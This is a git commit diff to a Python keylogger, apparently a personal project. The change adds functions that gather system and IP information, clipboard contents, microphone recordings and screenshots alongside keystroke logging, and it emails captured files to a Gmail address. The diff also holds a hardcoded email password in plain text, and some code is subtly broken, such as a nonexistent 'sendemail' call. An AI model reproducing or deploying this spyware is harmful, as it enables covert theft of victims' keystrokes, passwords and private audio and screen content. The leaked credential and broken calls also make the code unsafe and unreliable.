c0105491682c86523199d1e66ee4120e8ccd4cb6
Ayesha Khan <56893650+ayeshak98@users.noreply.github.com>
2024-04-08 12:23:41 -0500

    Update keylogger.py
    Added more code to it. Added the sound recording feature and screenshot feature as well.

--- keylogger.py
+++ keylogger.py
@@ -1,4 +1,4 @@
-# Libraries
+# Importing libraries
 
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -28,12 +28,21 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "key_log.txt"
+system_information = "systeminfo.txt"
+clipboard_information = "clipboard.txt"
+audio_information = "audio.wav"
+screenshot_information = "screenshot.png"
+
+microphone_time = 10
+time_iteration = 15
+number_of_iterations_end = 3
+
 email_address = "ayeshaloggerproject@gmail.com"
-password = "p@ssw0rd54321"
+password = "Baxter.Leo043023"
 
 toaddr = "ayeshaloggerproject@gmail.com"
 
-file_path = "C:\\Users\\ayesh\\PycharmProjects\\pythonProject10\\Project"
+file_path = "C:\\Users\\ayesh\\PycharmProjects\\pythonProject9\\Project"
 extend = "\\"
 
 def send_email(filename, attachment, toaddr):
@@ -73,44 +82,116 @@ def send_email(filename, attachment, toaddr):
 
     text = msg.as_string()
 
-    # Sending the mail
-    s.sendmail(fromaddr, toaddr, text)
+    # Sending the email
+    s.sendemail(fromaddr, toaddr, text)
 
     # Terminating the session
     s.quit()
 
-send_email(keys_information, file_path + extend + keys_information, toaddr)
 
-count = 0
-keys = []
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip)
 
-def on_press(key):
-    global keys, count
+        except Exception:
+            f.write("Couldn't get Public IP Address (most likely max query)" + '\n')
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + '\n')
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + '\n')
 
-    print(key)
-    keys.append(key)
-    count += 1
+computer_information()
 
-    if count >= 1:
-        count = 0
-        write_file(keys)
-        keys = []
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
 
-def write_file(keys):
-    with open(file_path + extend + keys_information, "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write('\n')
-                f.close()
-            elif k.find("Key") == -1:
-                f.write(k)
-                f.close()
+            f.write("Clipboard Data: \n" + pasted_data)
 
-def on_release(key):
-    if key == Key.esc:
-        return False
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+        except:
+            f.write("Clipboard could not be copied")
 
+copy_clipboard()
+
+def microphone():
+    fs = 44100
+    seconds = microphone_time
+
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    sd.wait()
+
+    write(file_path + extend + audio_information, fs, myrecording)
+
+microphone()
+
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_information)
+
+screenshot()
+
+number_of_iterations = 0
+currentTime = time.time()
+stoppingTime = time.time() + time_iteration
+
+while number_of_iterations < number_of_iterations_end:
+
+
+    count = 0
+    keys = []
+
+    def on_press(key):
+        global keys, count, currentTime
+
+        print(key)
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
+
+        if count >= 1:
+            count = 0
+            write_file(keys)
+            keys = []
+
+    def write_file(keys):
+        with open(file_path + extend + keys_information, "a") as f:
+            for key in keys:
+                k = str(key).replace("'" , "")
+                if k.find("space") > 0:
+                    f.write('\n')
+                    f.close()
+                elif k.find("Key") == -1:
+                    f.write(k)
+                    f.close()
+
+    def on_release(key):
+        if key == Key.esc:
+            return False
+        if currentTime > stoppingTime:
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+    if currentTime > stoppingTime:
+
+        with open(file_path + extend + keys_information, "w") as f:
+            f.write(" ")
+
+        screenshot()
+        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
+        copy_clipboard()
+
+        number_of_iterations += 1
+
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iteration
